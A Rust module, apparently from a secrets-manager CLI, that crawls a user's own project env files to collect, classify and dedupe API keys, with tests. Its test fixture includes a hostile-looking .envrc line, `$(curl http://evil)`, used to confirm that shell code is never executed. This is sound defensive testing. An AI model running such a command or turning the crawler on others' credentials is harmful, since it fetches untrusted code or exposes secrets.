//! `export --from-env DIR`: find the keys a person already has scattered across their
//! projects' env files, so onboarding is one command instead of twenty pastes.
//!
//! Pure: walks a tree, parses env files textually, classifies and dedupes. It never
//! executes anything (`.envrc` is code; only its plain `KEY=value` / `export KEY=value`
//! lines are read), never follows symlinks, never reads files owned by another user, and
//! reports problems as `path:line`, never as file contents. Values are held as
//! `SecretString` and compared in memory only.

use crate::registry;
use secrecy::SecretString;
use std::collections::HashMap;
use std::path::{Path, PathBuf};

pub const MAX_FILE_BYTES: u64 = 1024 * 1024;
pub const MAX_DEPTH: usize = 12;
const SKIP_DIRS: &[&str] = &[".git", ".svn", ".hg", "node_modules", "target", "dist", "build", ".next", ".nuxt", "vendor", ".venv", "venv", "env", "site-packages", "__pycache__", ".cache", ".tox", ".turbo", ".terraform", ".gradle", ".pnpm-store", ".yarn", "Library", ".Trash", "pkg"];
/// Values that are obviously not credentials, whatever the name says.
const PLACEHOLDERS: &[&str] = &["changeme", "change-me", "change_me", "development", "secret", "password", "example", "placeholder", "todo", "replace-me", "replaceme", "xxx", "test", "testing", "dummy", "sample", "your-key-here", "your_key_here", "insert-here", "none", "null"];
/// A table longer than this is not something a person reviews row by row.
pub const MAX_CANDIDATES: usize = 500;
const PUBLIC_PREFIXES: &[&str] = &["NEXT_PUBLIC_", "VITE_", "REACT_APP_", "PUBLIC_", "NUXT_PUBLIC_", "EXPO_PUBLIC_"];
const NOT_SECRETS: &[&str] = &["PORT", "NODE_ENV", "HOST", "HOSTNAME", "DEBUG", "LOG_LEVEL", "TZ", "LANG", "PATH", "HOME", "USER", "SHELL", "EDITOR", "CI"];

/// Why a candidate is ticked or not by default.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub enum Confidence {
    /// Registry name, value matches its pattern.
    Registry,
    /// Registry name, but the value does not match the documented shape (placeholder?).
    RegistryShapeMismatch,
    /// Unregistered, but named and shaped like a secret.
    Heuristic,
}

/// Print-safe rendering of a path: control characters and escapes stripped, so a directory
/// named to look like a table row cannot forge one.
pub fn display_path(p: &Path) -> String {
    p.to_string_lossy().chars().filter(|c| !c.is_control()).collect()
}

pub(crate) fn is_placeholder(value: &str) -> bool {
    let v = value.trim().to_ascii_lowercase();
    PLACEHOLDERS.contains(&v.as_str()) || v.chars().all(|c| c == 'x' || c == '*' || c == '.' || c == '-' || c == '_')
}

#[derive(Debug)]
pub struct Candidate {
    pub name: String,
    pub value: SecretString,
    pub confidence: Confidence,
    pub provider: Option<String>,
    pub sensitive: bool,
    /// Every env FILE this exact value was found in (so `.env` vs `.env.local` in one
    /// project can be told apart).
    pub sources: Vec<PathBuf>,
    /// Other names the same value appeared under (e.g. OPENAI_KEY next to OPENAI_API_KEY).
    pub aliases: Vec<String>,
}

#[derive(Debug, Default)]
pub struct Crawl {
    pub candidates: Vec<Candidate>,
    pub files_scanned: usize,
    /// A path or `path:line`, then the reason; never content.
    pub problems: Vec<String>,
}

fn is_env_file(name: &str) -> bool {
    if name == ".envrc" || name == ".envrc.local" || name == ".envrc.private" { return true; }
    if !name.starts_with(".env") { return false; }
    let rest = &name[4..];
    if rest.is_empty() || rest == ".local" { return true; }
    let lower = rest.to_ascii_lowercase();
    if lower.contains("example") || lower.contains("sample") || lower.contains("template") || lower.contains("dist") || lower.ends_with(".bak") { return false; }
    rest.starts_with('.')
}

fn owned_by_me(md: &std::fs::Metadata) -> bool {
    use std::os::unix::fs::MetadataExt;
    md.uid() == crate::envfile::euid()
}
/// `.envrc` lines can be code; keep only plain assignments.
fn envrc_line_is_plain(line: &str) -> bool {
    let t = line.trim();
    !(t.contains("$(") || t.contains('`') || t.starts_with("source ") || t.starts_with(". ") || t.starts_with("eval ") || t.contains("${"))
}

/// Crawl candidates are the conventional uppercase names: a lowercase `path=` in an `.envrc`
/// is shell state, not a credential. Import itself accepts what `need` accepts.
fn name_ok(name: &str) -> bool {
    crate::need::valid_name(name) && name.bytes().all(|b| !b.is_ascii_lowercase())
}

/// Does an uppercase variable name say it holds a credential? Also used by `run` to decide
/// which inherited values get each of their lines masked.
pub fn secret_ish_name(name: &str) -> bool {
    ["KEY", "TOKEN", "SECRET", "PASSWORD", "PASSWD", "DSN", "CREDENTIAL", "CREDENTIALS", "AUTH", "PRIVATE"].iter().any(|k| name.contains(k))
}

/// Classify one assignment, or None if it is not a candidate.
fn classify(name: &str, value: &str) -> Option<(Confidence, Option<String>, bool)> {
    if !name_ok(name) { return None; }
    if PUBLIC_PREFIXES.iter().any(|p| name.starts_with(p)) || NOT_SECRETS.contains(&name) { return None; }
    if value.chars().count() < crate::tasks::MIN_SECRET_CHARS || value.chars().any(|c| c.is_control()) { return None; }
    if let Some(p) = registry::lookup(name) {
        // A registry name with no documented shape is only "a real key" if the value looks
        // like one; `AUTH_SECRET=development` must not be ticked by default.
        let matches = match &p.pattern {
            Some(pat) => regex::Regex::new(pat).map(|re| re.is_match(value)).unwrap_or(true),
            None => crate::validate::looks_like_secret(value),
        } && !is_placeholder(value);
        let sensitive = crate::registry::is_sensitive(Some(p), &SecretString::from(value.to_string())).unwrap_or(true);
        return Some((if matches { Confidence::Registry } else { Confidence::RegistryShapeMismatch }, Some(p.provider.clone()), sensitive));
    }
    if secret_ish_name(name) && !is_placeholder(value) && !value.contains("://") && !value.starts_with('/') && crate::validate::looks_like_secret(value) {
        return Some((Confidence::Heuristic, None, false));
    }
    None
}

/// Walk `root` and collect candidates. Dedupes by exact value: one candidate per distinct
/// value, listing every source project and every name it appeared under.
pub fn crawl(root: &Path) -> Crawl {
    let mut out = Crawl::default();
    // Keyed by an in-memory digest of the value, so no second plaintext copy of every
    // secret lives in a map for the whole walk (the digest is never persisted or shown).
    let mut by_value: HashMap<String, usize> = HashMap::new();
    let digest = |v: &str| -> String {
        use sha2::{Digest, Sha256};
        let mut h = Sha256::new();
        h.update(v.as_bytes());
        format!("{:x}", h.finalize())
    };
    let mut seen_files: std::collections::HashSet<PathBuf> = Default::default();
    let mut stack: Vec<(PathBuf, usize)> = vec![(root.to_path_buf(), 0)];
    while let Some((dir, depth)) = stack.pop() {
        let Ok(rd) = std::fs::read_dir(&dir) else { out.problems.push(format!("{} is an unreadable directory", display_path(&dir))); continue };
        for entry in rd.flatten() {
            let path = entry.path();
            let Ok(md) = std::fs::symlink_metadata(&path) else { continue };
            if md.file_type().is_symlink() { continue; }
            let fname = entry.file_name().to_string_lossy().to_string();
            if md.is_dir() {
                if !owned_by_me(&md) { continue; }
                if SKIP_DIRS.contains(&fname.as_str()) { continue; }
                if depth >= MAX_DEPTH { out.problems.push(format!("{} is deeper than {} levels, not scanned", display_path(&path), MAX_DEPTH)); continue; }
                stack.push((path, depth + 1));
                continue;
            }
            if !md.is_file() || !is_env_file(&fname) { continue; }
            if !owned_by_me(&md) { out.problems.push(format!("{} is not owned by you, skipped", display_path(&path))); continue; }
            if md.len() > MAX_FILE_BYTES { out.problems.push(format!("{} is larger than {} bytes, skipped", display_path(&path), MAX_FILE_BYTES)); continue; }
            let canon = path.canonicalize().unwrap_or(path.clone());
            if !seen_files.insert(canon) { continue; }
            // A committed env file is a fixture or a plant, never the person's real secrets
            // (those are gitignored). Skip it and say so.
            if let Some(root) = crate::envfile::git_root(&dir) {
                if crate::envfile::is_git_tracked(&root, &path) {
                    out.problems.push(format!("{} is tracked by git, skipped (committed env files are fixtures or plants, not your secrets)", display_path(&path)));
                    continue;
                }
            }
            let Ok(text) = std::fs::read_to_string(&path) else { out.problems.push(format!("{} is not UTF-8 text, skipped", display_path(&path))); continue };
            let text = text.strip_prefix('\u{feff}').unwrap_or(&text).to_string();
            out.files_scanned += 1;
            let is_envrc = fname.starts_with(".envrc");
            for (i, line) in text.lines().enumerate() {
                if is_envrc && !envrc_line_is_plain(line) { continue; }
                let Some((name, value)) = crate::envfile::parse_line(line) else { continue };
                let Some((confidence, provider, sensitive)) = classify(&name, &value) else { continue };
                if out.candidates.len() >= MAX_CANDIDATES {
                    out.problems.push(format!("{}:{} has more than {} distinct values; the rest were not read", display_path(&path), i + 1, MAX_CANDIDATES));
                    break;
                }
                // One row per (value, registry name). The same value under two REGISTRY
                // names (DATABASE_URL / DIRECT_URL) is two keys a project may ask for by
                // either name; under an unregistered name it is an alias of the registry row.
                let is_registry = confidence != Confidence::Heuristic;
                let d = digest(&value);
                let key = if is_registry { format!("{name}\0{d}") } else { format!("\0{d}") };
                let existing = by_value.get(&key).copied().or_else(|| if is_registry { None } else { by_value.keys().find(|k| k.ends_with(&format!("\0{d}"))).and_then(|k| by_value.get(k)).copied() });
                match existing {
                    Some(idx) => {
                        let c = &mut out.candidates[idx];
                        if !c.sources.contains(&path) { c.sources.push(path.clone()); }
                        if c.name != name && !c.aliases.contains(&name) {
                            if c.confidence == Confidence::Heuristic && is_registry {
                                // promote: the registry name becomes canonical
                                let old = std::mem::replace(&mut c.name, name.clone());
                                c.aliases.push(old);
                                c.confidence = confidence;
                                c.provider = provider;
                                c.sensitive = sensitive;
                                by_value.remove(&format!("\0{d}"));
                                by_value.insert(key, idx);
                            } else {
                                c.aliases.push(name.clone());
                            }
                        }
                    }
                    None => {
                        by_value.insert(key, out.candidates.len());
                        out.candidates.push(Candidate { name, value: SecretString::from(value), confidence, provider, sensitive, sources: vec![path.clone()], aliases: vec![] });
                    }
                }
            }
        }
    }
    // deterministic order: registry first, then name, then the first source path, so the
    // same tree always yields the same rows and the same identity numbering
    for c in &mut out.candidates { c.sources.sort(); }
    out.candidates.sort_by(|a, b| (a.confidence != Confidence::Registry).cmp(&(b.confidence != Confidence::Registry)).then(a.name.cmp(&b.name)).then(a.sources[0].cmp(&b.sources[0])));
    drop(by_value);
    out
}

/// Distinct values under one name: the second and later get their own identity so the
/// human can tell them apart and `bind` projects later.
pub fn identity_for(candidates: &[Candidate], idx: usize, default_identity: &str) -> String {
    identity_among(candidates, idx, default_identity, |_| true)
}

/// Same, counting only the rows `included` (the ticked ones), so unticking the first
/// `OPENAI_API_KEY` row leaves no hole: the kept row becomes `default`.
pub fn identity_among(candidates: &[Candidate], idx: usize, default_identity: &str, included: impl Fn(usize) -> bool) -> String {
    let name = &candidates[idx].name;
    let nth = (0..idx).filter(|&i| included(i) && &candidates[i].name == name).count();
    if nth == 0 { default_identity.to_string() } else { format!("{default_identity}{}", nth + 1) }
}

/// Distinct values under one name in the same tree: ambiguity. Nothing is ticked by default
/// for such a name, because which one is the real key is the person's call.
pub fn is_ambiguous(candidates: &[Candidate], idx: usize) -> bool {
    let name = &candidates[idx].name;
    candidates.iter().filter(|c| &c.name == name).count() > 1
}

#[cfg(test)]
mod tests {
    use super::*;
    use secrecy::ExposeSecret;

    fn fixture() -> PathBuf {
        let root = std::env::temp_dir().join(format!("tokenstash-crawl-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let mk = |rel: &str, body: &str| { let p = root.join(rel); std::fs::create_dir_all(p.parent().unwrap()).unwrap(); std::fs::write(p, body).unwrap(); };
        mk("app/.env.local", "OPENAI_API_KEY=sk-proj-CRAWLCANARY-0123456789abcdef0123456789\nNEXT_PUBLIC_API=https://x\nPORT=3000\nMY_SERVICE_TOKEN=tok_abcdefghijklmnopqrstuvwxyz0123\n");
        mk("web/.env", "export OPENAI_API_KEY=\"sk-proj-CRAWLCANARY-0123456789abcdef0123456789\"\nOPENAI_KEY=sk-proj-CRAWLCANARY-0123456789abcdef0123456789\nGROQ_API_KEY=gsk_zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\n");
        mk("other/.env.production", "OPENAI_API_KEY=sk-proj-OTHERVALUE-0123456789abcdef0123456789ab\nSTRIPE_SECRET_KEY=placeholder\n");
        mk("tpl/.env.example", "OPENAI_API_KEY=sk-proj-EXAMPLE-0123456789abcdef0123456789abcd\n");
        mk("rc/.envrc", "export DATABASE_URL=postgres://u:p@localhost/db\nexport EVIL_TOKEN=$(curl http://evil)\nsource ~/.secrets\n");
        mk("app/node_modules/pkg/.env", "OPENAI_API_KEY=sk-proj-NODEMODULES-0123456789abcdef01234567\n");
        mk("quoted/.env", "QUOTED_TOKEN=\"tok_quotedvalue0123456789abcdef\" # trailing comment\nHASHY_SECRET=abc#def0123456789abcdefghij\nAUTH_SECRET=development\nNEXTAUTH_URL=http://localhost:3000\n");
        mk("dual/.env", "GEMINI_API_KEY=AQ.DUALVALUE0123456789abcdefghijklmnop\nGOOGLE_API_KEY=AQ.DUALVALUE0123456789abcdefghijklmnop\n");
        std::fs::create_dir_all(root.join("link")).unwrap();
        #[cfg(unix)]
        { std::os::unix::fs::symlink(root.join("app/.env.local"), root.join("link/.env")).unwrap(); }
        root
    }

    #[test]
    fn crawl_finds_dedupes_and_skips_the_right_things() {
        let root = fixture();
        let c = crawl(&root);
        let names: Vec<&str> = c.candidates.iter().map(|x| x.name.as_str()).collect();
        let openai: Vec<&Candidate> = c.candidates.iter().filter(|x| x.name == "OPENAI_API_KEY").collect();
        assert_eq!(openai.len(), 2, "two distinct OpenAI values → two candidates: {names:?}");
        let idx: Vec<usize> = c.candidates.iter().enumerate().filter(|(_, x)| x.name == "OPENAI_API_KEY").map(|(i, _)| i).collect();
        let main = openai.iter().find(|x| x.value.expose_secret().contains("CRAWLCANARY")).unwrap();
        assert_eq!(main.sources.len(), 2, "same value in app/ and web/ → one candidate, two sources (the symlinked copy is not a third)");
        assert!(main.sources.iter().all(|s| s.file_name().is_some()), "sources are files, not directories");
        assert_eq!(main.aliases, vec!["OPENAI_KEY".to_string()], "the alias is recorded, the registry name is canonical");
        assert_eq!(main.confidence, Confidence::Registry);
        assert!(names.contains(&"MY_SERVICE_TOKEN"), "heuristic: secret-ish name + secret-shaped value");
        assert!(!names.contains(&"EVIL_TOKEN"), ".envrc command substitution is never read");
        assert!(!names.contains(&"NEXT_PUBLIC_API") && !names.contains(&"PORT"));
        assert!(!c.candidates.iter().any(|x| x.value.expose_secret().contains("EXAMPLE")), ".env.example is skipped");
        assert!(!c.candidates.iter().any(|x| x.value.expose_secret().contains("NODEMODULES")), "node_modules is skipped");
        let stripe = c.candidates.iter().find(|x| x.name == "STRIPE_SECRET_KEY").unwrap();
        assert_eq!(stripe.confidence, Confidence::RegistryShapeMismatch);
        assert!(!stripe.sensitive, "a placeholder is not a live key, so the live-mode sensitivity pattern does not fire");
        // quoted value with a trailing comment keeps the value, drops the quotes and comment
        let q = c.candidates.iter().find(|x| x.name == "QUOTED_TOKEN").expect("quoted token");
        assert_eq!(q.value.expose_secret(), "tok_quotedvalue0123456789abcdef");
        // a '#' inside an unquoted token is part of the value
        let h = c.candidates.iter().find(|x| x.name == "HASHY_SECRET").expect("hashy");
        assert_eq!(h.value.expose_secret(), "abc#def0123456789abcdefghij");
        // pattern-less registry name with a placeholder value is NOT a confident match
        let auth = c.candidates.iter().find(|x| x.name == "AUTH_SECRET");
        assert!(auth.map(|a| a.confidence != Confidence::Registry).unwrap_or(true), "AUTH_SECRET=development must not be ticked by default");
        assert!(!names.contains(&"NEXTAUTH_URL"), "a URL is not a secret even with AUTH in the name");
        // the same value under two REGISTRY names is two rows (either may be asked for)
        assert!(names.contains(&"GEMINI_API_KEY") && names.contains(&"GOOGLE_API_KEY"), "{names:?}");
        assert!(names.contains(&"DATABASE_URL"), "plain .envrc export line is read");
        // ambiguity: two distinct OPENAI values → both flagged
        assert!(idx.iter().all(|&i| is_ambiguous(&c.candidates, i)));
        // identity over the ticked set: unticking the first leaves no hole
        assert_eq!(identity_among(&c.candidates, idx[1], "default", |i| i != idx[0]), "default");
        assert_eq!(identity_for(&c.candidates, idx[0], "default"), "default");
        assert_eq!(identity_for(&c.candidates, idx[1], "default"), "default2");
        for p in &c.problems { assert!(!p.contains("CRAWLCANARY"), "problems never carry content"); }
        let _ = std::fs::remove_dir_all(&root);
    }
}
